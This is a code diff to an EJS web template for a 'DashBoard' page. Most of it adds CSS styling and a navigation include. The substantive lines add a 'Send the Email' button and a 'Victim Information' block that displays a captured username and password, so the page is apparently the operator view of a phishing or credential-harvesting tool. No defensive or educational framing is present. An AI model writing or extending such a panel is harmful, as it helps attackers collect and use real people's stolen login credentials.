@@ -5,15 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>DashBoard</title>
   </head>
+  <style>
+    h1 {
+      text-align: center;
+      margin-bottom: 3rem;
+    }
+    .button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1.2rem;
+    }
+    button {
+      padding: 1rem;
+      font-size: 1.3rem;
+      width: 15rem;
+      background-color: lightblue;
+      border: none;
+      outline: none;
+    }
+    .info {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1.2rem;
+      flex-direction: column;
+      font-size: 1.3rem;
+      font-family: "Courier New", Courier, monospace;
+      font-weight: 300;
+      margin-top: 3rem;
+    }
+  </style>
   <body>
+    <%- include("includes/nav.ejs") %>
     <h1>DashBoard</h1>
-    <div>
+    <div class="button">
       <button>Send the Email</button>
     </div>
-    <div>
+    <div class="info">
       Victim Information
-      <div>UserName</div>
-      <div>Password</div>
+      <div>UserName: <%= username %></div>
+      <div>Password: <%= password %></div>
     </div>
   </body>
 </html>
